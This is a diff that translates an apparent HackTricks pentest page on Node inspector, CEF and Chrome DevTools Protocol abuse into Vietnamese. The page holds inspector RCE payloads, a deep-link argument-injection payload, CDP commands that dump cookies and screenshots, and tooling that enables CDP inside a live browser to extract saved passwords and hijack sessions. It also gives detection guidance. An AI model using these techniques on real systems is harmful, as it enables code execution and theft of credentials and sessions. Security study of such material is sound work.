@@ -1,19 +1,19 @@
-# Node inspector/CEF debug abuse
+# Lạm dụng debug Node inspector/CEF
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Historical practical examples include the Multimaster walkthrough and the CVE-2019-1414 Visual Studio Code debugger attack; use them as version-specific context rather than assuming every current Electron or Chromium target exposes the same primitives.<sup>[[1]](#references)[[3]](#references)</sup>
+Các ví dụ thực tế trong quá khứ gồm hướng dẫn Multimaster và cuộc tấn công debugger của Visual Studio Code CVE-2019-1414; hãy xem chúng là bối cảnh phụ thuộc vào phiên bản, thay vì mặc định rằng mọi mục tiêu Electron hoặc Chromium hiện nay đều có cùng các primitive.<sup>[[1]](#references)[[3]](#references)</sup>
 
-## Basic Information
+## Thông tin cơ bản
 
-[From the docs](https://nodejs.org/learn/getting-started/debugging): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.<sup>[[4]](#references)</sup>
+[Theo tài liệu](https://nodejs.org/learn/getting-started/debugging): Khi được khởi chạy với tùy chọn `--inspect`, một tiến trình Node.js sẽ lắng nghe các client debug. Theo **mặc định**, tiến trình sẽ lắng nghe tại host và cổng **`127.0.0.1:9229`**. Mỗi tiến trình cũng được gán một **UUID duy nhất**.<sup>[[4]](#references)</sup>
 
-Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>
+Client inspector phải biết và chỉ định địa chỉ host, cổng và UUID để kết nối. URL đầy đủ sẽ có dạng như `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>
 
 > [!WARNING]
-> Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).<sup>[[4]](#references)</sup>
+> Vì **debugger có toàn quyền truy cập vào môi trường thực thi Node.js**, tác nhân độc hại có thể kết nối đến cổng này có khả năng thực thi mã tùy ý thay mặt cho tiến trình Node.js (**có thể leo thang đặc quyền**).<sup>[[4]](#references)</sup>
 
-There are several ways to start an inspector:<sup>[[4]](#references)</sup>
+Có một số cách để khởi chạy inspector:<sup>[[4]](#references)</sup>
 
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
@@ -26,24 +26,24 @@ node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
 
-When you start an inspected process something like this will appear:<sup>[[4]](#references)</sup>
+Khi bạn khởi chạy một tiến trình đang được kiểm tra, nội dung tương tự như sau sẽ xuất hiện:<sup>[[4]](#references)</sup>
 
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
 
-Processes based on **CEF** (**Chromium Embedded Framework**) can expose a debugger with `--remote-debugging-port=9222`. This exposes the browser through the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) rather than a Node.js inspector, so Node.js `process`-based payloads are not directly applicable by default.<sup>[[2]](#references)[[5]](#references)</sup>
+Các tiến trình dựa trên **CEF** (**Chromium Embedded Framework**) có thể mở debugger bằng `--remote-debugging-port=9222`. Cách này cho phép truy cập trình duyệt thông qua [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), thay vì Node.js inspector, vì vậy các payload dựa trên `process` của Node.js mặc định không thể áp dụng trực tiếp.<sup>[[2]](#references)[[5]](#references)</sup>
 
-When you start a debugged browser something like this will appear:<sup>[[2]](#references)[[5]](#references)</sup>
+Khi khởi động một trình duyệt có bật debug, bạn sẽ thấy nội dung tương tự như sau:<sup>[[2]](#references)[[5]](#references)</sup>
 
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
 
-### Enumerating and driving a CDP endpoint
+### Liệt kê và điều khiển endpoint CDP
 
-The HTTP discovery endpoints distinguish the **browser** WebSocket from individual **target** (tab, worker, extension, etc.) WebSockets. Query `/json/version` for the browser endpoint and `/json/list` for targets; the returned `webSocketDebuggerUrl` values can then be driven directly with CDP's JSON-RPC-like messages.<sup>[[5]](#references)</sup>
+Các endpoint khám phá HTTP phân biệt WebSocket **browser** với WebSocket của từng **target** (tab, worker, extension, v.v.). Truy vấn `/json/version` để lấy endpoint của browser và `/json/list` để lấy danh sách target; sau đó có thể điều khiển trực tiếp các giá trị `webSocketDebuggerUrl` được trả về bằng các thông điệp dạng JSON-RPC của CDP.<sup>[[5]](#references)</sup>
 
 ```bash
 # Browser metadata and browser-level WebSocket
@@ -57,23 +57,23 @@ BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebugg
 PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
 ```
 
-For example, connect with `websocat "$BROWSER_WS"` and send `{"id":1,"method":"Target.getTargets"}` or `{"id":2,"method":"Storage.getCookies"}`. On a page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` executes in that renderer and `Page.captureScreenshot` returns a base64-encoded screenshot. `document.cookie` cannot reveal `HttpOnly` cookies, whereas `Storage.getCookies` asks the browser for its cookie store.<sup>[[5]](#references)</sup>
+Ví dụ, kết nối bằng `websocat "$BROWSER_WS"` rồi gửi `{"id":1,"method":"Target.getTargets"}` hoặc `{"id":2,"method":"Storage.getCookies"}`. Trên một page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` thực thi trong renderer đó và `Page.captureScreenshot` trả về ảnh chụp màn hình được mã hóa base64. `document.cookie` không thể tiết lộ cookie `HttpOnly`, trong khi `Storage.getCookies` yêu cầu trình duyệt truy vấn kho cookie của nó.<sup>[[5]](#references)</sup>
 
 ```json
 {"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
 {"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
 ```
 
-### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
+### Trình duyệt, WebSocket và chính sách same-origin <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** precisely.<sup>[[4]](#references)</sup>
+Các website mở trong trình duyệt web có thể gửi yêu cầu WebSocket và HTTP theo mô hình bảo mật của trình duyệt. Cần có **kết nối HTTP ban đầu** để **lấy mã định danh phiên debugger duy nhất**. **Chính sách same-origin** **ngăn** các website tạo **kết nối HTTP này**. Để tăng cường bảo mật trước [**các cuộc tấn công DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js xác minh rằng **các header 'Host'** của kết nối chỉ định chính xác một **địa chỉ IP** hoặc **`localhost`**.<sup>[[4]](#references)</sup>
 
 > [!TIP]
-> This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).<sup>[[4]](#references)</sup>
+> **Biện pháp bảo mật này ngăn việc khai thác inspector** để chạy mã chỉ bằng cách **gửi một yêu cầu HTTP** (có thể thực hiện bằng cách khai thác lỗ hổng SSRF).<sup>[[4]](#references)</sup>
 
-### Starting inspector in running processes
+### Khởi chạy inspector trong các tiến trình đang chạy
 
-You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.<sup>[[4]](#references)</sup>
+Bạn có thể gửi **signal SIGUSR1** đến một tiến trình nodejs đang chạy để khiến tiến trình đó **khởi chạy inspector** trên cổng mặc định. Tuy nhiên, lưu ý rằng bạn cần có đủ quyền, vì vậy việc này có thể cấp cho bạn **quyền truy cập đặc quyền vào thông tin bên trong tiến trình**, nhưng không trực tiếp dẫn đến leo thang đặc quyền.<sup>[[4]](#references)</sup>
 
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
@@ -81,15 +81,15 @@ kill -s SIGUSR1 <nodejs-ps>
 ```
 
 > [!TIP]
-> This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.<sup>[[6]](#references)</sup>
+> Điều này hữu ích trong các container vì **tắt process rồi khởi động process mới** với `--inspect` **không phải là một lựa chọn**, bởi **container** sẽ bị **tắt** cùng với process.<sup>[[6]](#references)</sup>
 
-### Connect to inspector/debugger
+### Kết nối với inspector/debugger
 
-To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:<sup>[[2]](#references)[[4]](#references)</sup>
+Để kết nối với **trình duyệt dựa trên Chromium**, có thể truy cập các URL `chrome://inspect` hoặc `edge://inspect` tương ứng cho Chrome hoặc Edge. Nhấp vào nút Configure để đảm bảo **host và port đích** được liệt kê chính xác. Hình ảnh minh họa một ví dụ Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>
 
-![After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Connect to inspector/debugger: To connect to a Chromium-based browser ,...](<../../images/image (674).png>)
+![Sau đó, URL để truy cập debugger sẽ xuất hiện. Ví dụ: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Kết nối với inspector/debugger: Để kết nối với trình duyệt dựa trên Chromium,...](<../../images/image (674).png>)
 
-Using the **command line** you can connect to a debugger/inspector with:<sup>[[2]](#references)[[4]](#references)</sup>
+Bạn có thể kết nối với debugger/inspector bằng **dòng lệnh**:<sup>[[2]](#references)[[4]](#references)</sup>
 
 ```bash
 node inspect <ip>:<port>
@@ -98,7 +98,7 @@ node inspect 127.0.0.1:9229
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
 
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.<sup>[[2]](#references)</sup>
+Công cụ [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) cho phép **tìm các inspector** đang chạy cục bộ và **inject code** vào chúng.<sup>[[2]](#references)</sup>
 
 ```bash
 #List possible vulnerable sockets
@@ -110,14 +110,14 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 ```
 
 > [!TIP]
-> Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).<sup>[[2]](#references)[[5]](#references)</sup>
+> Lưu ý rằng **các exploit RCE của NodeJS sẽ không hoạt động** nếu kết nối với trình duyệt thông qua [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (bạn cần kiểm tra API để tìm những việc thú vị có thể thực hiện với nó).<sup>[[2]](#references)[[5]](#references)</sup>
 
-## RCE in NodeJS Debugger/Inspector
+## RCE trong NodeJS Debugger/Inspector
 
 > [!TIP]
-> If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)
+> Nếu bạn tìm đến đây để biết cách có được [**RCE từ XSS trong Electron, hãy xem trang này.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)
 
-Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
+Một số cách phổ biến để có được **RCE** khi bạn có thể **kết nối** với Node **inspector** là sử dụng những thứ như (có vẻ như cách này **sẽ không hoạt động khi kết nối với Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
 
 ```javascript
 process.mainModule.require("child_process").exec("calc")
@@ -126,39 +126,39 @@ require("child_process").spawnSync("calc.exe")
 Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ```
 
-## Chrome DevTools Protocol Payloads
+## Payloads của Chrome DevTools Protocol
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
-In this section I will just list interesting things I find people have used to exploit this protocol.
+Bạn có thể xem API tại đây: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
+Trong phần này, tôi sẽ chỉ liệt kê những điều thú vị mà tôi thấy mọi người đã sử dụng để khai thác protocol này.
 
-### Chrome 136+ default-profile restriction
+### Giới hạn hồ sơ mặc định từ Chrome 136 trở lên
 
-Starting with **Chrome 136**, Chrome ignores `--remote-debugging-port` and `--remote-debugging-pipe` when they target the **default Chrome data directory**. The switch must be paired with a non-standard `--user-data-dir`, whose separate encryption key and isolated browser state prevent the simple flag-based technique from exposing the user's normal authenticated profile. This Chrome-specific restriction should not be assumed to cover older Chrome builds, Chrome for Testing, Electron/CEF applications, or other Chromium derivatives without verification.<sup>[[14]](#references)</sup>
+Bắt đầu từ **Chrome 136**, Chrome bỏ qua `--remote-debugging-port` và `--remote-debugging-pipe` khi chúng nhắm đến **thư mục dữ liệu Chrome mặc định**. Các switch này phải được dùng cùng với `--user-data-dir` không theo mặc định; khóa mã hóa riêng và trạng thái trình duyệt biệt lập của thư mục này ngăn kỹ thuật đơn giản dựa trên flag làm lộ hồ sơ người dùng thông thường đã đăng nhập. Không nên cho rằng giới hạn đặc thù của Chrome này cũng áp dụng cho các bản Chrome cũ hơn, Chrome for Testing, ứng dụng Electron/CEF hoặc các biến thể Chromium khác nếu chưa xác minh.<sup>[[14]](#references)</sup>
 
 ```bash
 # Valid current-Chrome debugging setup, but this is a new isolated profile
 google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
 ```
 
-Therefore, seeing a current Chrome process launched only with `--remote-debugging-port` does **not** prove that CDP became active. Confirm the listener and `/json/version`, and determine which profile actually backs it.<sup>[[14]](#references)</sup>
+Do đó, việc thấy một tiến trình Chrome hiện tại chỉ được khởi chạy với `--remote-debugging-port` **không** chứng minh rằng CDP đã được kích hoạt. Hãy xác nhận listener và `/json/version`, đồng thời xác định profile nào thực sự đang được sử dụng.<sup>[[14]](#references)</sup>
 
-### Parameter Injection via Deep Links
+### Tiêm tham số qua Deep Links
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://index.html) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.<sup>[[8]](#references)</sup>
+Trong [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security phát hiện một ứng dụng dựa trên CEF **đã đăng ký một URI tùy chỉnh** trên hệ thống (`workspaces://index.html`), nhận toàn bộ URI rồi **khởi chạy ứng dụng dựa trên CEF** với cấu hình được tạo một phần từ URI đó.<sup>[[8]](#references)</sup>
 
-It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.<sup>[[8]](#references)</sup>
+Người ta phát hiện các tham số URI được giải mã URL rồi dùng để khởi chạy ứng dụng CEF cơ bản, cho phép người dùng **tiêm** flag **`--gpu-launcher`** vào **dòng lệnh** và thực thi các lệnh tùy ý.<sup>[[8]](#references)</sup>
 
-So, a payload like:
+Vì vậy, một payload như:
 
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
 
-Will execute a calc.exe.<sup>[[8]](#references)</sup>
+Sẽ thực thi calc.exe.<sup>[[8]](#references)</sup>
 
-### Overwrite Files
+### Ghi đè tệp
 
-Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.<sup>[[5]](#references)[[6]](#references)</sup>
+Thay đổi thư mục nơi **các tệp đã tải xuống sẽ được lưu** rồi tải xuống một tệp để **ghi đè** **mã nguồn** thường được ứng dụng sử dụng bằng **mã độc của bạn**.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
@@ -174,21 +174,21 @@ ws.send(
 )
 ```
 
-### Webdriver RCE and exfiltration
+### Webdriver RCE và exfiltration
 
-STAR Labs showed that exposed WebDriver/CDP services can enable arbitrary file reads and RCE; DNS rebinding can complete the exploit chain in some configurations.<sup>[[9]](#references)</sup>
+STAR Labs đã chỉ ra rằng các dịch vụ WebDriver/CDP bị lộ có thể cho phép đọc tệp tùy ý và RCE; trong một số cấu hình, DNS rebinding có thể hoàn tất chuỗi khai thác.<sup>[[9]](#references)</sup>
 
-ChromeDriver's WebDriver service is distinct from Chrome DevTools/CDP. Its [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) selects the browser executable launched for a new session. If an unprivileged caller can reach a ChromeDriver service running as root and submit a session with a caller-controlled executable path, that launch can cross the service's privilege boundary. An empty `/sessions` response does not settle whether new sessions can be created. Inspect process owner, actual listener reachability, session authorization, executable access, and confinement before concluding the path is usable; a process name or usual port alone is insufficient. [Google's security guidance](https://developer.chrome.com/docs/chromedriver/security-considerations) says to run ChromeDriver under an unprivileged account. Passive enumeration should not create a WebDriver session.
+Dịch vụ WebDriver của ChromeDriver khác với Chrome DevTools/CDP. Capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) chọn tệp thực thi trình duyệt được khởi chạy cho một session mới. Nếu một caller không có đặc quyền có thể truy cập dịch vụ ChromeDriver đang chạy với quyền root và gửi một session kèm đường dẫn tệp thực thi do caller kiểm soát, tiến trình khởi chạy đó có thể vượt qua ranh giới đặc quyền của dịch vụ. Phản hồi `/sessions` trống không đủ để kết luận rằng không thể tạo session mới. Trước khi kết luận đường khai thác này khả thi, hãy kiểm tra chủ sở hữu tiến trình, khả năng truy cập listener thực tế, cơ chế cấp quyền cho session, quyền truy cập tệp thực thi và các biện pháp hạn chế. Chỉ dựa vào tên tiến trình hoặc cổng thường dùng là chưa đủ. [Hướng dẫn bảo mật của Google](https://developer.chrome.com/docs/chromedriver/security-considerations) khuyến nghị chạy ChromeDriver bằng tài khoản không có đặc quyền. Không nên tạo WebDriver session khi chỉ thực hiện enumeration thụ động.
 
-For additional historical browser-automation and Chromium security cases, see the Counter WebDriver write-up and Project Zero issues 773, 1742, and 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>
+Để biết thêm các vụ việc lịch sử về tự động hóa trình duyệt và bảo mật Chromium, xem bài viết về Counter WebDriver và các vấn đề 773, 1742, 1944 của Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>
 
-### Enabling CDP inside a live Chromium process
+### Bật CDP bên trong tiến trình Chromium đang chạy
 
-Chrome's default-profile restriction only blocks the command-line activation path. With sufficient same-user access to manipulate the browser process, the original [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) and the Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) invoke Chromium's non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` inside the already-running `chrome.exe` or `msedge.exe`. The endpoint therefore belongs to the real profile, retaining its tabs, extensions, cookies and authenticated state.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>
+Hạn chế profile mặc định của Chrome chỉ chặn phương thức kích hoạt bằng command line. Khi có đủ quyền truy cập cùng user để thao tác với tiến trình trình duyệt, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ban đầu và [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) của Cobalt Strike gọi hàm không được export `content::DevToolsAgentHost::StartRemoteDebuggingServer` bên trong `chrome.exe` hoặc `msedge.exe` đang chạy. Do đó, endpoint thuộc về profile thực, giữ nguyên các tab, extension, cookie và trạng thái xác thực của profile đó.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>
 
-For ordinary x64 Chrome/Edge processes, the BOF finds the browser window and loaded `chrome.dll`/`msedge.dll`, scans the remote PE for masked signatures, allocates stubs and a context block, temporarily replaces the window procedure, and dispatches the final call on the browser **UI thread**. The relevant runtime inputs are `StartRemoteDebuggingServer`, Chromium's `operator new`, `TCPServerSocketFactory::CreateForHttpServer`, and the factory vtable. Execution stops unless each mandatory signature has a unique match.<sup>[[15]](#references)[[16]](#references)</sup>
+Với các tiến trình Chrome/Edge x64 thông thường, BOF tìm cửa sổ trình duyệt và `chrome.dll`/`msedge.dll` đã được nạp, quét PE từ xa để tìm các signature có mask, cấp phát stub và một khối context, tạm thời thay thế window procedure, rồi thực thi lời gọi cuối cùng trên **UI thread** của trình duyệt. Các đầu vào runtime liên quan là `StartRemoteDebuggingServer`, `operator new` của Chromium, `TCPServerSocketFactory::CreateForHttpServer` và vtable của factory. Quá trình thực thi sẽ dừng nếu bất kỳ signature bắt buộc nào không khớp duy nhất một lần.<sup>[[15]](#references)[[16]](#references)</sup>
 
-The BOF accepts a browser mode and optional port. Its helper script can then verify the endpoint and collect cookies; `chrome-iso` is a separate path for Chrome's Windows Process Isolation boundary.<sup>[[16]](#references)</sup>
+BOF nhận chế độ trình duyệt và cổng tùy chọn. Sau đó, script trợ giúp có thể xác minh endpoint và thu thập cookie; `chrome-iso` là một phương thức riêng để vượt qua ranh giới Windows Process Isolation của Chrome.<sup>[[16]](#references)</sup>
 
 ```text
 cdp-enable chrome
@@ -197,14 +197,14 @@ cdp-enable chrome-iso
 python .\grab_cookies.py --port 9222 --output cookies.json
 ```
 
-The `chrome-iso` path uses only query-limited handles to the isolated process. It identifies the installed `chrome.dll` whose PE image size matches the live process, resolves symbols from that local image, and uses Chromium's `WindowImpl` dispatch plus synchronous `WM_COPYDATA` and an existing-image User32 hook to reach the UI thread.<sup>[[16]](#references)</sup>
+Đường dẫn `chrome-iso` chỉ sử dụng các handle có quyền truy vấn đến tiến trình cô lập. Nó xác định `chrome.dll` đã cài đặt có kích thước ảnh PE khớp với tiến trình đang chạy, phân giải symbol từ ảnh cục bộ đó, rồi dùng cơ chế dispatch `WindowImpl` của Chromium cùng `WM_COPYDATA` đồng bộ và một hook User32 trong ảnh hiện có để tiếp cận luồng UI.<sup>[[16]](#references)</sup>
 
 > [!WARNING]
-> This is a **post-compromise browser-process manipulation** technique, not an unauthenticated network bypass. It is build-dependent because the relevant C++ symbols are not exported and can change after browser updates.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>
+> Đây là kỹ thuật **thao túng tiến trình browser sau khi đã chiếm quyền**, không phải cách vượt qua mạng khi chưa xác thực. Kỹ thuật này phụ thuộc vào bản build vì các symbol C++ liên quan không được export và có thể thay đổi sau khi browser được cập nhật.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>
 
-#### Refreshing signatures after browser updates
+#### Cập nhật signature sau khi browser được cập nhật
 
-Use the exact version of `chrome.dll` or `msedge.dll` installed on the target and its matching PDB. `symchk.exe` from the Windows SDK downloads the symbols; the repository scripts then locate `StartRemoteDebuggingServer`, derive the allocator/socket-factory inputs, or validate every signature embedded in the BOF.<sup>[[16]](#references)[[18]](#references)</sup>
+Sử dụng đúng phiên bản `chrome.dll` hoặc `msedge.dll` được cài trên mục tiêu và PDB tương ứng. `symchk.exe` từ Windows SDK tải symbol; sau đó, các script trong repository xác định `StartRemoteDebuggingServer`, suy ra các đầu vào của allocator/socket-factory hoặc xác thực mọi signature được nhúng trong BOF.<sup>[[16]](#references)[[18]](#references)</sup>
 
 ```powershell
 # Run from a directory containing the exact target DLL
@@ -216,13 +216,13 @@ python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
 python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
 ```
 
-A zero-hit or multi-hit result must not be replaced with an arbitrary address. If a known `operator new` or `CreateForHttpServer` pattern changed too much to seed a new mask, use `pe_signature_finder.py` with the PDB to inspect that symbol and derive a byte sequence which is unique in the target module.<sup>[[16]](#references)[[18]](#references)</sup>
+Kết quả không có hit hoặc có nhiều hit không được thay bằng một địa chỉ tùy ý. Nếu mẫu `operator new` hoặc `CreateForHttpServer` đã biết thay đổi quá nhiều để tạo mask mới, hãy dùng `pe_signature_finder.py` cùng với PDB để kiểm tra symbol đó và suy ra một chuỗi byte duy nhất trong module mục tiêu.<sup>[[16]](#references)[[18]](#references)</sup>
 
-#### Authenticated-browser extraction with CDP Toolkit
+#### Trích xuất từ trình duyệt đã xác thực bằng CDP Toolkit
 
-This technique does not decrypt App-Bound Encryption (ABE) offline or remove device binding. It instead treats the legitimate browser as a **decryption oracle and authenticated interaction proxy**: `Storage.getCookies` asks the live browser for its cookie store, while navigation/screencast workflows keep requests, storage, enterprise authentication and device-bound behavior inside the victim's existing browser.<sup>[[17]](#references)[[18]](#references)</sup>
+Kỹ thuật này không giải mã App-Bound Encryption (ABE) offline hoặc loại bỏ ràng buộc thiết bị. Thay vào đó, nó xem trình duyệt hợp pháp như một **decryption oracle và proxy tương tác đã xác thực**: `Storage.getCookies` yêu cầu trình duyệt đang chạy cung cấp cookie store, trong khi các quy trình điều hướng/screencast giữ yêu cầu, bộ nhớ lưu trữ, xác thực doanh nghiệp và hành vi gắn với thiết bị bên trong trình duyệt hiện có của nạn nhân.<sup>[[17]](#references)[[18]](#references)</sup>
 
-After routing the loopback CDP listener through the operator's pivot, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) can enumerate and collect common artifacts.<sup>[[17]](#references)[[18]](#references)</sup>
+Sau khi định tuyến listener CDP loopback qua pivot của operator, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) có thể liệt kê và thu thập các artifact phổ biến.<sup>[[17]](#references)[[18]](#references)</sup>
 
 ```powershell
 pip install -e .
@@ -236,19 +236,19 @@ cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
 cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
 ```
 
-`discover`, `tabs list`, `cookies dump`, and `tabs screenshot` are mostly wrappers around `/json/version`, the target list, `Storage.getCookies`, and `Page.captureScreenshot`. History, bookmarks, extensions and password metadata instead require a temporary `chrome://`/`edge://` WebUI target: the toolkit waits for the surface to render, inspects its model or DOM, collects the result, and closes the target.<sup>[[17]](#references)[[18]](#references)</sup>
+`discover`, `tabs list`, `cookies dump` và `tabs screenshot` chủ yếu là các wrapper quanh `/json/version`, danh sách target, `Storage.getCookies` và `Page.captureScreenshot`. History, bookmarks, extensions và metadata mật khẩu thì cần một target WebUI `chrome://`/`edge://` tạm thời: toolkit chờ giao diện hiển thị, kiểm tra model hoặc DOM, thu thập kết quả rồi đóng target.<sup>[[17]](#references)[[18]](#references)</sup>
 
-`saved-passwords dump` goes further: it opens the real saved-login origin, focuses a credential field, selects the native autofill suggestion using CDP input events, and reads the populated values. The origin/port/path must closely match the saved-password realm; visible mode is the reliable default because the suggestion popup is native browser UI.<sup>[[17]](#references)[[18]](#references)</sup>
+`saved-passwords dump` đi xa hơn: nó mở origin đăng nhập đã lưu thực tế, focus vào trường thông tin xác thực, chọn gợi ý autofill gốc bằng các sự kiện input của CDP rồi đọc các giá trị đã được điền. Origin/port/path phải khớp sát với realm của mật khẩu đã lưu; chế độ hiển thị là lựa chọn mặc định đáng tin cậy vì popup gợi ý là giao diện gốc của trình duyệt.<sup>[[17]](#references)[[18]](#references)</sup>
 
-For live interaction, `browser-takeover screencast` streams frames and sends input to a real target (including background or off-screen modes). `browser-takeover proxy` instead accepts HTTP and HTTPS `CONNECT` locally and makes upstream requests through hidden Chrome targets, falling back to background tabs where hidden targets are unavailable; this preserves the victim's network/authentication context but is less faithful for complex client-side applications because the operator browser renders the returned content.<sup>[[17]](#references)[[18]](#references)</sup>
+Để tương tác trực tiếp, `browser-takeover screencast` truyền các frame và gửi input đến một target thực (bao gồm cả chế độ nền hoặc ngoài màn hình). Ngược lại, `browser-takeover proxy` tiếp nhận HTTP và HTTPS `CONNECT` cục bộ, rồi gửi các request upstream thông qua các target Chrome ẩn, chuyển sang dùng tab nền khi không có target ẩn; cách này giữ nguyên ngữ cảnh mạng/xác thực của nạn nhân nhưng kém trung thực hơn với các ứng dụng client-side phức tạp vì trình duyệt của operator render nội dung nhận về.<sup>[[17]](#references)[[18]](#references)</sup>
 
-For detection, do not rely only on `--remote-debugging-*` command-line telemetry: also correlate unusual handles and memory operations against browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, and unexpected loopback listening sockets owned by Chrome/Edge.<sup>[[15]](#references)</sup>
+Để phát hiện, đừng chỉ dựa vào telemetry dòng lệnh `--remote-debugging-*`: hãy đồng thời đối chiếu các handle và thao tác bộ nhớ bất thường nhắm vào tiến trình trình duyệt (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tạo thread), DLL injection và các socket lắng nghe loopback bất thường do Chrome/Edge sở hữu.<sup>[[15]](#references)</sup>
 
 ### Post-Exploitation
 
